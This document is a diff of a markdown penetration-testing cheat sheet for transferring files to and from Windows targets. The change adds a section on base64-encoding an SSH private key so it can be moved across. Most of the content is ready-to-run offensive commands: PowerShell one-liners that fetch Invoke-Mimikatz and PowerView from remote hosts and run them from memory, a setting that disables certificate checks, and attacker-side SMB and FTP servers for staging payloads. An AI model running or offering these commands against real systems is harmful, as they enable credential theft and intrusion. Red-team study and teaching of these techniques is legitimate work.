@@ -1,40 +1,42 @@
-# File Transfer
-
-- ## *Windows*
-	- ### *Download*
-		- ##### PowerShell
-			- **System.Net.WebClient**
-				- Download a file over `HTTP, HTTPS or FTP`.
-				- `(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')`
-				- Fileless method using `Invoke-Expression` (run from memory).
-					- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
-					- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
-			- **Invoke-WebRequest**
-				- But it is **slower** at downloading files (aliases `iwr, curl, wget`)
-				- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
-			- **Common Errors**
-				- Internet Explorer first-launch configuration isn't completed, use the option `-UseBasicParsing`.
-					- `iwr https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
-				- Certificate isn't trusted
-					- Use this command before the download command. `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
-		- ##### SMB
-			- Create an `SMB` server on our device with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) and then use `copy, move` or PowerShell `Copy-Item`.
-				- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` on the attack device.
-					- Mount the `SMB` server with username and password. `net use n: \\<ip>\share /user:test test`
-					- `copy n:\file` on the target device. 
-				- Without `-user` and `-password`, no need to mount. `copy \\<ip>\share\file`.
-		- ##### FTP
-			-  Configure an `FTP` server on our device with Python module `pyftpdlib`.
-				- `sudo pip3 install pyftpdlib`
-				- By default, `pyftpdlib` uses port `2121`.
-				- Start the server using `sudo python3 -m pyftpdlib --port 21`
-				- Using PowerShell
-					- `(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file', '<to path>'`
-					- In case **Non-Interactive Shell**, create an FTP command file to download a file.
-						- `echo open <ip> > ftpcommand.txt`
-						- `echo USER anonymous >> ftpcommand.txt`
-						- `echo binary >> ftpcommand.txt`
-						- `echo GET file.txt >> ftpcommand.txt`
-						- `echo bye >> ftpcommand.txt`
-						- `ftp -v -n -s:ftpcommand.txt`
-	- ### *Upload*
+# *Windows*
+- ### *PowerShell Base64 Encode & Decode*
+	- Encode SSH key using `cat id_rsa | base64 -w 0;echo`.
+	- Copy the content and put it into a Windows PowerShell and use some PowerShell functions to decode it using `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))`.
+	- Confirm the file was transferred successfully using `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`.
+	- **NOTE:** CMD has a maximum string length of 8,191 characters, which could make this method not impossible.
+- ### *Download*
+	- ##### PowerShell
+		- **System.Net.WebClient**
+			- Download a file over `HTTP, HTTPS or FTP`.
+			- `(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')`
+			- Fileless method using `Invoke-Expression` (run from memory).
+				- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
+				- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
+		- **Invoke-WebRequest**
+			- But it is **slower** at downloading files (aliases `iwr, curl, wget`)
+			- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
+		- **Common Errors**
+			- Internet Explorer first-launch configuration isn't completed, use the option `-UseBasicParsing`.
+				- `iwr https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
+			- Certificate isn't trusted
+				- Use this command before the download command. `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
+	- ##### SMB
+		- Create an `SMB` server on our device with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) and then use `copy, move` or PowerShell `Copy-Item`.
+			- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` on the attack device.
+				- Mount the `SMB` server with username and password. `net use n: \\<ip>\share /user:test test`
+				- `copy n:\file` on the target device. 
+			- Without `-user` and `-password`, no need to mount. `copy \\<ip>\share\file`.
+	- ##### FTP
+		-  Configure an `FTP` server on our device with Python module `pyftpdlib`.
+			- `sudo pip3 install pyftpdlib`
+			- By default, `pyftpdlib` uses port `2121`.
+			- Start the server using `sudo python3 -m pyftpdlib --port 21`
+			- Using PowerShell
+				- `(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file', '<to path>'`
+				- In case **Non-Interactive Shell**, create an FTP command file to download a file.
+					- `echo open <ip> > ftpcommand.txt`
+					- `echo USER anonymous >> ftpcommand.txt`
+					- `echo binary >> ftpcommand.txt`
+					- `echo GET file.txt >> ftpcommand.txt`
+					- `echo bye >> ftpcommand.txt`
+					- `ftp -v -n -s:ftpcommand.txt`
